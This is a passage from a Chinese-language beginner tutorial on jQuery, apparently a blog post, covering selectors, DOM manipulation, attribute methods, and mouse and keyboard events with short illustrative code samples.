        <content type="html"><![CDATA[<p>jQuery是一个快速、简洁的<a href="https://baike.baidu.com/item/JavaScript/321142?fromModule=lemma_inlink">JavaScript</a>框架，是继Prototype之后又一个优秀的JavaScript<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E5%BA%93/969653?fromModule=lemma_inlink">代码库</a>（框架）于2006年1月由[John Resig](<a href="https://baike.baidu.com/item/John">https://baike.baidu.com/item/John</a> Resig/6336344?fromModule=lemma_inlink)发布。jQuery设计的宗旨是“write Less，Do More”，即倡导写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化<a href="https://baike.baidu.com/item/HTML/97049?fromModule=lemma_inlink">HTML</a>文档操作、<a href="https://baike.baidu.com/item/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/9582185?fromModule=lemma_inlink">事件处理</a>、动画设计和<a href="https://baike.baidu.com/item/Ajax/8425?fromModule=lemma_inlink">Ajax</a>交互。</p><p>jQuery的核心特性可以总结为：具有独特的链式语法和短小清晰的多功能接口；具有高效灵活的<a href="https://baike.baidu.com/item/CSS%E9%80%89%E6%8B%A9%E5%99%A8/2819686?fromModule=lemma_inlink">CSS选择器</a>，并且可对<a href="https://baike.baidu.com/item/CSS/5457?fromModule=lemma_inlink">CSS</a>选择器进行扩展；拥有便捷的插件扩展机制和丰富的插件。jQuery兼容各种主流浏览器，如<a href="https://baike.baidu.com/item/IE/69103?fromModule=lemma_inlink">IE</a> 6.0+、<a href="https://baike.baidu.com/item/FF/3053609?fromModule=lemma_inlink">FF</a> 1.5+、<a href="https://baike.baidu.com/item/Safari/597?fromModule=lemma_inlink">Safari</a> 2.0+、Opera 9.0+等。</p><p>[TOC]</p><h3 id="1-基础选择器"><a href="#1-基础选择器" class="headerlink" title="1.基础选择器"></a>1.基础选择器</h3><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>引入<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>ID点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn"</span>&gt;</span>类点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>标签点击<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) {<span class="comment">//加载函数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">"hello world"</span>);</span></span><br><span class="line"><span class="language-javascript">    });</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">"#btn"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">"这是用ID选中的"</span>)</span></span><br><span class="line"><span class="language-javascript">        });</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">".btn"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">"这是用类选中的"</span>)</span></span><br><span class="line"><span class="language-javascript">        });</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">"p"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">"这是用标签选中的"</span>)</span></span><br><span class="line"><span class="language-javascript">        });</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">"*"</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">"这是选择所有的"</span>)</span></span><br><span class="line"><span class="language-javascript">        });</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">"#btn,.btn,p"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">"这是并集选择器"</span>)</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript">        }</span></span><br><span class="line"><span class="language-javascript">    );</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="2-层级选择器"><a href="#2-层级选择器" class="headerlink" title="2.层级选择器"></a>2.层级选择器</h3><p>JQuery的层次选择器可以帮助我们更精确地选择DOM元素。下面是一些常见的层次选择器的例子，希望能帮助新手更容易理解：</p><ol><li>子元素选择器（child selector）：选择某个元素的直接子元素。 例如：<code>$("ul &gt; li")</code> 选择ul元素下的所有直接子元素li。</li><li>后代元素选择器（descendant selector）：选择某个元素的所有后代元素。 例如：<code>$("div span")</code> 选择div元素下的所有后代元素span。</li><li>相邻兄弟元素选择器（adjacent sibling selector）：选择某个元素的下一个相邻兄弟元素。 例如：<code>$("h1 + p")</code> 选择h1元素后面的第一个相邻兄弟元素p。</li><li>兄弟元素选择器（general sibling selector）：选择某个元素的所有兄弟元素。 例如：<code>$("h1 ~ p")</code> 选择h1元素后面的所有兄弟元素p。</li><li>父元素选择器（parent selector）：选择某个元素的父元素。 例如：<code>$("li").parent()</code> 选择所有li元素的父元素。</li><li>祖先元素选择器（ancestor selector）：选择某个元素的所有祖先元素。 例如：<code>$("span").parents()</code> 选择所有span元素的祖先元素。</li></ol><p>这些层次选择器可以根据具体的DOM结构和需求进行灵活的组合使用，帮助我们更准确地选择和操作DOM元素</p><p>例子:</p><h4 id="1-子元素选择器（child-selector）"><a href="#1-子元素选择器（child-selector）" class="headerlink" title="1.子元素选择器（child selector）"></a>1.子元素选择器（child selector）</h4><p>选择指定父元素下的直接子元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 选择id为parent的元素下的所有直接子元素为p的元素</span></span><br><span class="line">$(<span class="string">"#parent &gt; p"</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="2-后代元素选择器（descendant-selector）"><a href="#2-后代元素选择器（descendant-selector）" class="headerlink" title="2.后代元素选择器（descendant selector）"></a>2.后代元素选择器（descendant selector）</h4><p>选择指定父元素下的所有后代元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//选择id为parent的元素下的所有后代元素为p的元素</span></span><br><span class="line">$(<span class="string">"#parent p"</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="3-相邻兄弟元素选择器（adjacent-sibling-selector）"><a href="#3-相邻兄弟元素选择器（adjacent-sibling-selector）" class="headerlink" title="3.相邻兄弟元素选择器（adjacent sibling selector）"></a>3.相邻兄弟元素选择器（adjacent sibling selector）</h4><p>选择指定元素后面紧邻的兄弟元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 选择id为sibling1的元素后面紧邻的兄弟元素为sibling2的元素</span></span><br><span class="line">$(<span class="string">"#sibling1 + #sibling2"</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="4-全部兄弟元素选择器（general-sibling-selector）："><a href="#4-全部兄弟元素选择器（general-sibling-selector）：" class="headerlink" title="4.全部兄弟元素选择器（general sibling selector）："></a>4.全部兄弟元素选择器（general sibling selector）：</h4><p>选择指定元素后面的所有兄弟元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 选择id为sibling1的元素后面的所有兄弟元素为sibling2的元素</span></span><br><span class="line">$(<span class="string">"#sibling1 ~ #sibling2"</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="5-父元素选择器（parent-selector）"><a href="#5-父元素选择器（parent-selector）" class="headerlink" title="5.父元素选择器（parent selector）"></a>5.父元素选择器（parent selector）</h4><p>选择指定元素的父元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 选择class为child的元素的父元素</span></span><br><span class="line">$(<span class="string">".child"</span>).<span class="title function_">parent</span>()</span><br></pre></td></tr></tbody></table></figure><h4 id="6-祖先元素选择器（ancestor-selector）："><a href="#6-祖先元素选择器（ancestor-selector）：" class="headerlink" title="6.祖先元素选择器（ancestor selector）："></a>6.祖先元素选择器（ancestor selector）：</h4><p>选择指定元素的所有祖先元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 选择class为child的元素的所有祖先元素</span></span><br><span class="line">$(<span class="string">".child"</span>).<span class="title function_">parents</span>()</span><br></pre></td></tr></tbody></table></figure><h3 id="3-过滤选择器"><a href="#3-过滤选择器" class="headerlink" title="3.过滤选择器"></a>3.过滤选择器</h3><p>JQuery是一个流行的JavaScript库，它提供了一种简化DOM操作的方式。JQuery选择器允许你使用类似CSS选择器的语法来选择DOM元素，并且可以根据需要组合使用多个选择器，以实现更精确的选择。</p><p>下面是一些常见的JQuery过滤选择器及其用法示例：</p><ol><li><strong>元素选择器</strong>：通过元素名称来选择特定的DOM元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'p'</span>) <span class="comment">// 选择所有的&lt;p&gt;元素</span></span><br><span class="line">$(<span class="string">'input'</span>) <span class="comment">// 选择所有的&lt;input&gt;元素</span></span><br></pre></td></tr></tbody></table></figure><ol><li><strong>类选择器</strong>：通过类名来选择具有特定类的DOM元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'.myClass'</span>) <span class="comment">// 选择所有具有类名为"myClass"的元素</span></span><br><span class="line">$(<span class="string">'#myId'</span>) <span class="comment">// 选择ID为"myId"的元素</span></span><br></pre></td></tr></tbody></table></figure><ol><li><strong>属性选择器</strong>：通过元素的属性值来选择元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'input[type="text"]'</span>) <span class="comment">// 选择所有类型为"text"的&lt;input&gt;元素</span></span><br><span class="line">$(<span class="string">'a[href^="https"]'</span>) <span class="comment">// 选择所有以"https"开头的&lt;a&gt;元素</span></span><br></pre></td></tr></tbody></table></figure><ol><li><strong>子元素选择器</strong>：通过父元素来选择其子元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'ul li'</span>) <span class="comment">// 选择所有&lt;ul&gt;下的&lt;li&gt;元素</span></span><br><span class="line">$(<span class="string">'.myClass &gt; span'</span>) <span class="comment">// 选择具有类名为"myClass"的元素下的&lt;span&gt;元素</span></span><br></pre></td></tr></tbody></table></figure><ol><li><strong>过滤选择器</strong>：通过特定条件来选择元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'p:first'</span>) <span class="comment">// 选择第一个&lt;p&gt;元素</span></span><br><span class="line">$(<span class="string">'li:last'</span>) <span class="comment">// 选择最后一个&lt;li&gt;元素</span></span><br><span class="line">$(<span class="string">'tr:even'</span>) <span class="comment">// 选择所有偶数行的&lt;tr&gt;元素</span></span><br><span class="line">$(<span class="string">'div:animated'</span>) <span class="comment">// 选择正在执行动画的&lt;div&gt;元素</span></span><br></pre></td></tr></tbody></table></figure><ol><li><strong>内容过滤选择器</strong>：通过元素的文本内容来选择元素。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">'p:contains("Hello")'</span>) <span class="comment">// 选择包含文本"Hello"的&lt;p&gt;元素</span></span><br><span class="line">$(<span class="string">'p:empty'</span>) <span class="comment">// 选择没有子元素或文本内容的&lt;p&gt;元素</span></span><br><span class="line">$(<span class="string">'p:has(span)'</span>) <span class="comment">// 选择包含&lt;span&gt;元素的&lt;p&gt;元素</span></span><br></pre></td></tr></tbody></table></figure><p>这些只是JQuery选择器的一小部分，但是它们代表了一些常见的选择器用法。希望这些示例能够帮助新手更好地理解和使用JQuery选择器。</p><h3 id="4-JQueryDOM操作"><a href="#4-JQueryDOM操作" class="headerlink" title="4.JQueryDOM操作"></a>4.JQueryDOM操作</h3><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">        <span class="comment">//查找节点</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">"ul li"</span>));</span><br><span class="line">        <span class="comment">//创建节点</span></span><br><span class="line">        <span class="keyword">var</span> li1 = $(<span class="string">"&lt;li&gt;大头儿子&lt;/li&gt;"</span>);</span><br><span class="line">        <span class="keyword">var</span> li2 = $(<span class="string">"&lt;li&gt;小魔仙&lt;/li&gt;"</span>);</span><br><span class="line">        <span class="comment">//插入节点</span></span><br><span class="line">        $(<span class="string">"ul"</span>).<span class="title function_">after</span>(li1);</span><br><span class="line">        $(<span class="string">"ul"</span>).<span class="title function_">before</span>(li2);</span><br><span class="line">        <span class="comment">//删除元素</span></span><br><span class="line">        <span class="comment">// $("ul li:eq(1)").remove();</span></span><br><span class="line">        <span class="comment">// $("ul li").remove(":eq(1)");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//为li绑定点击事件</span></span><br><span class="line">        $(<span class="string">"ul li"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">"li"</span>);</span><br><span class="line">        })</span><br><span class="line">        <span class="comment">//代码段1：使用remove()方法删除</span></span><br><span class="line">        <span class="comment">// var delli1 = $("ul li:eq(1)").remove(); //删除指定元素</span></span><br><span class="line">        <span class="comment">// $("ul").append(delli1); //恢复元素，click事件不存在</span></span><br><span class="line">        <span class="comment">//代码段2：使用detach()方法删除</span></span><br><span class="line">        <span class="comment">// var delli2 = $("ul li:eq(1)").detach(); //删除指定元素</span></span><br><span class="line">        <span class="comment">// $("ul").append(delli2); //恢复元素,click事件仍存在</span></span><br><span class="line">        <span class="comment">// $("ul li:eq(2)").empty();</span></span><br><span class="line">        <span class="comment">//复制节点</span></span><br><span class="line">        $(<span class="string">"ul li:eq(0)"</span>).<span class="title function_">clone</span>(<span class="literal">true</span>).<span class="title function_">appendTo</span>(<span class="string">".animationList"</span>);</span><br><span class="line">        $(<span class="string">"ul li:eq(0)"</span>).<span class="title function_">clone</span>(<span class="literal">false</span>).<span class="title function_">appendTo</span>(<span class="string">".animationList"</span>);</span><br><span class="line">      </span><br><span class="line">    })</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h4 id="1-删除"><a href="#1-删除" class="headerlink" title="1.删除"></a>1.删除</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">       $(<span class="string">"ul li"</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">           <span class="title function_">alert</span>(<span class="string">"哈哈"</span>);</span><br><span class="line">       });</span><br><span class="line">       <span class="keyword">let</span> dt = $(<span class="string">"#a"</span>).<span class="title function_">remove</span>(); <span class="comment">//删除但是会保留事件</span></span><br><span class="line">       $(<span class="string">".animationList"</span>).<span class="title function_">append</span>(dt); <span class="comment">//追加</span></span><br><span class="line">   })</span><br></pre></td></tr></tbody></table></figure><h4 id="2-追加，移除样式"><a href="#2-追加，移除样式" class="headerlink" title="2.追加，移除样式"></a>2.追加，移除样式</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>热门动画排行<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"animationList"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"c"</span>&gt;</span>名侦探柯南<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>阿拉蕾<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span>海贼王<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">"#a"</span>).<span class="title function_">siblings</span>().<span class="title function_">css</span>(<span class="string">"color"</span>,<span class="string">"blue"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">"#b"</span>).<span class="title function_">parents</span>().<span class="title function_">css</span>(<span class="string">"color"</span>,<span class="string">"red"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">"#c"</span>).<span class="title function_">parent</span>().<span class="title function_">css</span>(<span class="string">"color"</span>,<span class="string">"yellow"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    $(<span class="string">"#c"</span>).<span class="title function_">parent</span>().<span class="title function_">css</span>(<span class="string">"font-size"</span>,<span class="number">5</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><p>Query是一个JavaScript库，提供了方便操作HTML元素和属性的方法。在JQuery中，属性值操作可以通过以下方法进行：</p><ol><li><p><code>attr()</code>方法：用于获取或设置元素的属性值。如果传递一个参数，该方法返回匹配元素的属性值；如果传递两个参数，第一个参数表示属性名，第二个参数表示要设置的属性值。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取src属性的值</span></span><br><span class="line"><span class="keyword">var</span> srcValue = $(<span class="string">'img'</span>).<span class="title function_">attr</span>(<span class="string">'src'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置src属性的值</span></span><br><span class="line">$(<span class="string">'img'</span>).<span class="title function_">attr</span>(<span class="string">'src'</span>, <span class="string">'new-image.jpg'</span>);</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>prop()</code>方法：用于获取或设置元素的属性值。与<code>attr()</code>方法不同的是，<code>prop()</code>方法用于处理元素自身的属性，如<code>checked</code>、<code>disabled</code>等。用法与<code>attr()</code>方法类似。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取checkbox是否选中</span></span><br><span class="line"><span class="keyword">var</span> isChecked = $(<span class="string">'#myCheckbox'</span>).<span class="title function_">prop</span>(<span class="string">'checked'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置checkbox为选中</span></span><br><span class="line">$(<span class="string">'#myCheckbox'</span>).<span class="title function_">prop</span>(<span class="string">'checked'</span>, <span class="literal">true</span>);</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>val()</code>方法：用于获取或设置表单元素的值（如<code>input</code>、<code>select</code>、<code>textarea</code>）。用法与<code>attr()</code>方法类似。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文本框的值</span></span><br><span class="line"><span class="keyword">var</span> inputValue = $(<span class="string">'#myInput'</span>).<span class="title function_">val</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文本框的值</span></span><br><span class="line">$(<span class="string">'#myInput'</span>).<span class="title function_">val</span>(<span class="string">'New value'</span>);</span><br></pre></td></tr></tbody></table></figure></li></ol><p>这些方法可以帮助新手轻松地操作和修改元素的属性值。通过选择元素并使用适当的方法，可以实现各种属性值的操作。</p><h4 id="3-读取"><a href="#3-读取" class="headerlink" title="3.读取"></a>3.读取</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> name = $(<span class="string">"#name"</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">let</span> val = $(<span class="string">"#password"</span>).<span class="title function_">val</span>();</span><br><span class="line">    <span class="keyword">if</span> (name ==<span class="string">"admin"</span> &amp;&amp; val==<span class="string">"admin"</span>){</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">"登录成功"</span>);</span><br><span class="line">    }<span class="keyword">else</span> {</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">"登录失败"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="5-事件和动画"><a href="#5-事件和动画" class="headerlink" title="5.事件和动画"></a>5.事件和动画</h3><h4 id="1-鼠标事件"><a href="#1-鼠标事件" class="headerlink" title="1.鼠标事件"></a>1.鼠标事件</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"#phone"</span>).<span class="title function_">mouseover</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul01"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"block"</span>);</span><br><span class="line">     }).<span class="title function_">mouseout</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul01"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"none"</span>);</span><br><span class="line">     });</span><br><span class="line">     $(<span class="string">"#home"</span>).<span class="title function_">mouseenter</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul02"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"block"</span>);</span><br><span class="line">     }).<span class="title function_">mouseleave</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul02"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"none"</span>);</span><br><span class="line">     });</span><br><span class="line">     $(<span class="string">"#outer"</span>).<span class="title function_">mouseenter</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul03"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"block"</span>);</span><br><span class="line">     }).<span class="title function_">mouseleave</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">         $(<span class="string">"#ul03"</span>).<span class="title function_">css</span>(<span class="string">"display"</span>,<span class="string">"none"</span>);</span><br><span class="line">     });</span><br></pre></td></tr></tbody></table></figure><p>JQuery是一个流行的JavaScript库，它简化了JavaScript代码的编写过程。JQuery提供了许多内置的方法和事件来处理用户与网页之间的交互，其中包括鼠标事件。</p><p>下面是一些常用的JQuery鼠标事件及其说明：</p><ol><li>click事件：当用户点击（单击）元素时触发。例如，下面的代码会在用户单击按钮时显示一个提示框：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"button"</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">"Button clicked!"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>dblclick事件：当用户双击元素时触发。例如，下面的代码会在用户双击图片时显示一个提示框：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"img"</span>).<span class="title function_">dblclick</span>(<span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">"Image double-clicked!"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>mouseenter事件：当鼠标进入元素时触发。例如，下面的代码会在鼠标进入指定区域时改变其背景颜色：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"#myDiv"</span>).<span class="title function_">mouseenter</span>(<span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">"background-color"</span>, <span class="string">"yellow"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>mouseleave事件：当鼠标离开元素时触发。例如，下面的代码会在鼠标离开指定区域时还原其背景颜色：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"#myDiv"</span>).<span class="title function_">mouseleave</span>(<span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">"background-color"</span>, <span class="string">"white"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><ol><li>mouseover事件：当鼠标移动到元素上方时触发。例如，下面的代码会在鼠标移动到图片上方时显示一个提示框：</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="string">"img"</span>).<span class="title function_">mouseover</span>(<span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">"Mouse over image!"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p>这些只是JQuery鼠标事件的一小部分，JQuery还提供了许多其他鼠标事件，如mousedown、mouseup、mousemove等。通过使用这些事件，你可以对用户与网页的交互进行更精确的控制。</p><h4 id="2-键盘事件"><a href="#2-键盘事件" class="headerlink" title="2.键盘事件"></a>2.键盘事件</h4><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">      $(<span class="string">"#message"</span>).<span class="title function_">keydown</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"按下键盘"</span>);</span><br><span class="line">      }).<span class="title function_">keyup</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"释放键盘"</span>)</span><br><span class="line">      }).<span class="title function_">keypress</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"产生可打印的字符"</span>)</span><br><span class="line">      });</span><br></pre></td></tr></tbody></table></figure><p>JQuery是一个流行的JavaScript库，提供了许多实用的功能和方法，其中包括处理键盘事件。键盘事件是在用户与网页交互时触发的事件，例如按下键盘上的按键或释放按键。</p><p>JQuery提供了多个键盘事件，下面是一些常用的键盘事件及其说明：</p><ul><li><code>keydown</code>: 当用户按下键盘上的任意键时触发。</li><li><code>keyup</code>: 当用户释放键盘上的任意键时触发。</li><li><code>keypress</code>: 当用户按下并释放键盘上的任意字符键时触发。注意，这个事件不会在按下非字符键时触发，例如Shift、Ctrl等键。</li><li><code>keypress</code>和<code>keydown</code>的区别是<code>keydown</code>事件能够触发非字符键的按下事件。</li></ul><p>以下是一个简单的例子，展示如何使用JQuery处理键盘事件：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">  $(<span class="variable language_">document</span>).<span class="title function_">keydown</span>(<span class="keyword">function</span>(<span class="params">event</span>) {</span><br><span class="line">    <span class="comment">// 获取按下的键码</span></span><br><span class="line">    <span class="keyword">var</span> keyCode = event.<span class="property">keyCode</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果按下的是Enter键</span></span><br><span class="line">    <span class="keyword">if</span> (keyCode === <span class="number">13</span>) {</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">"You pressed Enter key!"</span>);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span 